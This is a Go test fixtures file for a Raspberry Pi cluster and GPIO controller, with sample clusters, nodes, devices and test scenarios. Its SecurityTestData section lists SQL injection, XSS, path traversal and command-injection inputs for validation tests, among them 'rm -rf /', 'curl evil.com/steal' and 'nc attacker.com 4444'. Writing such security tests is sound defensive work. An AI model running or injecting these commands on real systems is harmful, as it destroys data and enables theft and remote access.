package fixtures

import (
	"fmt"
	"strings"
	"time"

	"github.com/dsyorkd/pi-controller/internal/models"
	"github.com/dsyorkd/pi-controller/internal/services"
)

// TestClusterData provides standard test clusters
var TestClusterData = struct {
	ActiveCluster     models.Cluster
	InactiveCluster   models.Cluster
	ProductionCluster models.Cluster
}{
	ActiveCluster: models.Cluster{
		ID:          1,
		Name:        "test-active-cluster",
		Description: "Active test cluster for unit testing",
		Status:      models.ClusterStatusActive,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	InactiveCluster: models.Cluster{
		ID:          2,
		Name:        "inactive-cluster",
		Description: "Inactive cluster",
		Status:      models.ClusterStatusFailed,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	ProductionCluster: models.Cluster{
		ID:          3,
		Name:        "production-cluster",
		Description: "Production cluster - handle with care",
		Status:      models.ClusterStatusActive,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
}

// TestNodeData provides standard test nodes
var TestNodeData = struct {
	RaspberryPi4    models.Node
	RaspberryPiZero models.Node
	OfflineNode     models.Node
}{
	RaspberryPi4: models.Node{
		ID:        1,
		Name:      "raspberry-pi-4",
		IPAddress: "192.168.1.100",
		Status:    models.NodeStatusReady,
		ClusterID: uintPtr(1), // Active cluster
		CreatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	RaspberryPiZero: models.Node{
		ID:        2,
		Name:      "raspberry-pi-zero",
		IPAddress: "192.168.1.101",
		Status:    models.NodeStatusReady,
		ClusterID: uintPtr(1), // Active cluster
		CreatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	OfflineNode: models.Node{
		ID:        3,
		Name:      "offline-node",
		IPAddress: "192.168.1.102",
		Status:    models.NodeStatusFailed,
		ClusterID: uintPtr(1), // Active cluster
		CreatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
}

// TestGPIODeviceData provides standard test GPIO devices
var TestGPIODeviceData = struct {
	LEDOutput      models.GPIODevice
	ButtonInput    models.GPIODevice
	PWMMotor       models.GPIODevice
	AnalogSensor   models.GPIODevice
	InactiveDevice models.GPIODevice
}{
	LEDOutput: models.GPIODevice{
		ID:          1,
		Name:        "status-led",
		Description: "Status LED on GPIO pin 18",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   18,
		Direction:   models.GPIODirectionOutput,
		PullMode:    models.GPIOPullNone,
		Value:       0,
		DeviceType:  models.GPIODeviceTypeDigital,
		Status:      models.GPIOStatusActive,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	ButtonInput: models.GPIODevice{
		ID:          2,
		Name:        "emergency-button",
		Description: "Emergency stop button on GPIO pin 19",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   19,
		Direction:   models.GPIODirectionInput,
		PullMode:    models.GPIOPullUp,
		Value:       1, // Pull-up means high by default
		DeviceType:  models.GPIODeviceTypeDigital,
		Status:      models.GPIOStatusActive,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	PWMMotor: models.GPIODevice{
		ID:          3,
		Name:        "servo-motor",
		Description: "Servo motor controlled via PWM on pin 20",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   20,
		Direction:   models.GPIODirectionOutput,
		PullMode:    models.GPIOPullNone,
		Value:       0,
		DeviceType:  models.GPIODeviceTypePWM,
		Status:      models.GPIOStatusActive,
		Config: models.GPIOConfig{
			Frequency: 50,
			DutyCycle: 7,
		},
		CreatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	AnalogSensor: models.GPIODevice{
		ID:          4,
		Name:        "temperature-sensor",
		Description: "Temperature sensor via I2C on pin 21",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   21,
		Direction:   models.GPIODirectionInput,
		PullMode:    models.GPIOPullNone,
		Value:       0,
		DeviceType:  models.GPIODeviceTypeI2C,
		Status:      models.GPIOStatusActive,
		Config: models.GPIOConfig{
			I2CAddress: 0x48,
			I2CBus:     1,
		},
		CreatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
	InactiveDevice: models.GPIODevice{
		ID:          5,
		Name:        "broken-sensor",
		Description: "Sensor that is currently inactive due to hardware failure",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   22,
		Direction:   models.GPIODirectionInput,
		PullMode:    models.GPIOPullDown,
		Value:       0,
		DeviceType:  models.GPIODeviceTypeDigital,
		Status:      models.GPIOStatusError,
		CreatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		UpdatedAt:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
	},
}

// TestGPIOReadingData provides standard test GPIO readings
var TestGPIOReadingData = []models.GPIOReading{
	{
		ID:        1,
		DeviceID:  1, // Status LED
		Value:     1.0,
		Timestamp: time.Date(2024, 1, 1, 12, 0, 0, 0, time.UTC),
	},
	{
		ID:        2,
		DeviceID:  1, // Status LED
		Value:     0.0,
		Timestamp: time.Date(2024, 1, 1, 12, 1, 0, 0, time.UTC),
	},
	{
		ID:        3,
		DeviceID:  2,   // Emergency button
		Value:     1.0, // Not pressed
		Timestamp: time.Date(2024, 1, 1, 12, 0, 0, 0, time.UTC),
	},
	{
		ID:        4,
		DeviceID:  2,   // Emergency button
		Value:     0.0, // Pressed!
		Timestamp: time.Date(2024, 1, 1, 12, 0, 30, 0, time.UTC),
	},
	{
		ID:        5,
		DeviceID:  4,    // Temperature sensor
		Value:     23.5, // 23.5°C
		Timestamp: time.Date(2024, 1, 1, 12, 0, 0, 0, time.UTC),
	},
	{
		ID:        6,
		DeviceID:  4,    // Temperature sensor
		Value:     24.1, // 24.1°C
		Timestamp: time.Date(2024, 1, 1, 12, 1, 0, 0, time.UTC),
	},
}

// TestServiceRequests provides standard service request structures
var TestServiceRequests = struct {
	CreateCluster services.CreateClusterRequest
	UpdateCluster services.UpdateClusterRequest
	CreateNode    services.CreateNodeRequest
	UpdateNode    services.UpdateNodeRequest
	CreateGPIO    services.CreateGPIODeviceRequest
	UpdateGPIO    services.UpdateGPIODeviceRequest
}{
	CreateCluster: services.CreateClusterRequest{
		Name:        "new-test-cluster",
		Description: "A new cluster created during testing",
	},
	UpdateCluster: services.UpdateClusterRequest{
		Description: stringPtr("Updated cluster description"),
		Status: func() *models.ClusterStatus {
			s := models.ClusterStatusFailed
			return &s
		}(),
	},
	CreateNode: services.CreateNodeRequest{
		Name:      "new-test-node",
		IPAddress: "192.168.1.200",
		ClusterID: uintPtr(1), // Active cluster
	},
	UpdateNode: services.UpdateNodeRequest{
		Status: func() *models.NodeStatus {
			s := models.NodeStatusFailed
			return &s
		}(),
	},
	CreateGPIO: services.CreateGPIODeviceRequest{
		Name:        "new-test-gpio",
		Description: "A new GPIO device created during testing",
		NodeID:      1, // Raspberry Pi 4
		PinNumber:   25,
		Direction:   models.GPIODirectionOutput,
		PullMode:    models.GPIOPullNone,
		DeviceType:  models.GPIODeviceTypeDigital,
	},
	UpdateGPIO: services.UpdateGPIODeviceRequest{
		Description: stringPtr("Updated GPIO device description"),
		Status: func() *models.GPIOStatus {
			s := models.GPIOStatusInactive
			return &s
		}(),
	},
}

// SecurityTestData provides data for security testing
var SecurityTestData = struct {
	MaliciousInputs   MaliciousInputData
	DangerousPins     []int
	SqlInjectionTests []string
	XssTests          []string
	CommandInjection  []string
}{
	MaliciousInputs: MaliciousInputData{
		SqlInjection: []string{
			"'; DROP TABLE clusters; --",
			"' OR '1'='1",
			"' UNION SELECT * FROM nodes--",
			"'; DELETE FROM gpio_devices WHERE '1'='1'; --",
		},
		XssPayloads: []string{
			"<script>alert('XSS')</script>",
			"javascript:alert('XSS')",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
		},
		CommandInjection: []string{
			"; rm -rf /",
			"&& curl evil.com/steal",
			"| nc attacker.com 4444",
			"; cat /etc/passwd",
			"$(curl evil.com/payload)",
		},
		BufferOverflow: []string{
			strings.Repeat("A", 10000),
			strings.Repeat("X", 100000),
		},
		PathTraversal: []string{
			"../../../etc/passwd",
			"..\\..\\windows\\system32\\config\\sam",
			"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		},
	},
	DangerousPins: []int{
		0, 1, // I2C pins - system critical
		14, 15, // UART pins - console communication
		-1, -99, // Invalid negative pins
		99, 999, // Invalid high pins
	},
	SqlInjectionTests: []string{
		"admin'--",
		"admin'/*",
		"' OR 1=1--",
		"' OR 'a'='a",
		"') OR ('a'='a",
	},
	XssTests: []string{
		"<script>alert(1)</script>",
		"</script><script>alert(1)</script>",
		"';alert(1);//",
		"javascript:alert(1)",
	},
	CommandInjection: []string{
		"`id`",
		"$(id)",
		"|id",
		";id",
		"&id",
		"||id",
		"&&id",
	},
}

// MaliciousInputData contains various malicious input patterns
type MaliciousInputData struct {
	SqlInjection     []string
	XssPayloads      []string
	CommandInjection []string
	BufferOverflow   []string
	PathTraversal    []string
}

// PerformanceTestData provides data for performance testing
var PerformanceTestData = struct {
	SmallDataset  []models.Cluster
	MediumDataset []models.Cluster
	LargeDataset  []models.Cluster
}{
	SmallDataset:  generateClusters(10),
	MediumDataset: generateClusters(100),
	LargeDataset:  generateClusters(1000),
}

// Helper functions

func stringPtr(s string) *string {
	return &s
}

func generateClusters(count int) []models.Cluster {
	clusters := make([]models.Cluster, count)
	for i := 0; i < count; i++ {
		clusters[i] = models.Cluster{
			ID:          uint(i + 1),
			Name:        fmt.Sprintf("perf-cluster-%d", i),
			Description: fmt.Sprintf("Performance test cluster #%d", i),
			Status:      models.ClusterStatusActive,
			CreatedAt:   time.Now().Add(-time.Duration(i) * time.Minute),
			UpdatedAt:   time.Now().Add(-time.Duration(i) * time.Minute),
		}
	}
	return clusters
}

// TestScenarios provides common test scenarios
var TestScenarios = struct {
	HappyPath    TestScenario
	ErrorCases   TestScenario
	EdgeCases    TestScenario
	SecurityTest TestScenario
}{
	HappyPath: TestScenario{
		Name:        "Happy Path",
		Description: "Standard successful operations",
		Steps: []TestStep{
			{Action: "Create cluster", Expected: "Success"},
			{Action: "Create node", Expected: "Success"},
			{Action: "Create GPIO device", Expected: "Success"},
			{Action: "Write to GPIO", Expected: "Success"},
			{Action: "Read from GPIO", Expected: "Success"},
		},
	},
	ErrorCases: TestScenario{
		Name:        "Error Handling",
		Description: "Various error conditions",
		Steps: []TestStep{
			{Action: "Create cluster with empty name", Expected: "Validation error"},
			{Action: "Create node with invalid IP", Expected: "Validation error"},
			{Action: "Write to non-existent GPIO", Expected: "Not found error"},
			{Action: "Delete cluster with nodes", Expected: "Constraint error"},
		},
	},
	EdgeCases: TestScenario{
		Name:        "Edge Cases",
		Description: "Boundary conditions and edge cases",
		Steps: []TestStep{
			{Action: "Create GPIO with pin 0", Expected: "May succeed or fail"},
			{Action: "Very long cluster name", Expected: "Validation error"},
			{Action: "Create 1000 clusters", Expected: "Should handle gracefully"},
			{Action: "Concurrent GPIO operations", Expected: "Should be thread-safe"},
		},
	},
	SecurityTest: TestScenario{
		Name:        "Security Vulnerabilities",
		Description: "Test for common security issues",
		Steps: []TestStep{
			{Action: "SQL injection in name field", Expected: "Should be sanitized"},
			{Action: "XSS in description field", Expected: "Should be escaped"},
			{Action: "Command injection in hostname", Expected: "Should be blocked"},
			{Action: "Access without authentication", Expected: "Should be denied"},
		},
	},
}

// TestScenario represents a complete test scenario
type TestScenario struct {
	Name        string
	Description string
	Steps       []TestStep
}

// TestStep represents a single step in a test scenario
type TestStep struct {
	Action   string
	Expected string
}

func uintPtr(i uint) *uint {
	return &i
}
